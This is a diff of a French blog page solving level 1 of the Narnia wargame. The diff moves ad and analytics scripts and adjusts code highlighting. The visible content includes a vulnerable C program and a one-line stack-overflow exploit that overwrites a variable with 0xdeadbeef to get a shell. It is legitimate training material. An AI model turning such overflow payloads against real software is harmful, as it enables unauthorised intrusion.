@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2010/08/01/wargame-narnia-at-intrudednet-level-1.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -176,7 +156,7 @@ Je vous présente donc ma solution pour le level1 de Narnia.</p>
 <span class="cp">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 </span>
-<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
         <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
         <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
 
@@ -196,7 +176,8 @@ Je vous présente donc ma solution pour le level1 de Narnia.</p>
         <span class="p">}</span>
 
         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Ce programme attend une entrée de 24 caractères (je vous dé-conseille vivement 
 d’utiliser scanf() pour vos entrées … difficilement maitrisable au niveau de
@@ -210,7 +191,8 @@ tels que ceux utilisés pour 0xdeadbeef.</p>
 <p>Le sploit :</p>
 
 <figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">'</span><span class="n">print</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">20</span> <span class="o">+</span> <span class="s">"</span><span class="se">\xef\xbe\xad\xde</span><span class="s">"</span><span class="err">'</span> <span class="p">;</span> <span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="o">/</span><span class="n">wargame</span><span class="o">/</span><span class="n">level1</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">'</span><span class="n">print</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">20</span> <span class="o">+</span> <span class="s">"</span><span class="se">\xef\xbe\xad\xde</span><span class="s">"</span><span class="err">'</span> <span class="p">;</span> <span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="o">/</span><span class="n">wargame</span><span class="o">/</span><span class="n">level1</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Le cat à la fin sert à éviter que le shell quitte et redonne la main au prompt.</p>
 
@@ -328,6 +310,26 @@ tels que ceux utilisés pour 0xdeadbeef.</p>
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
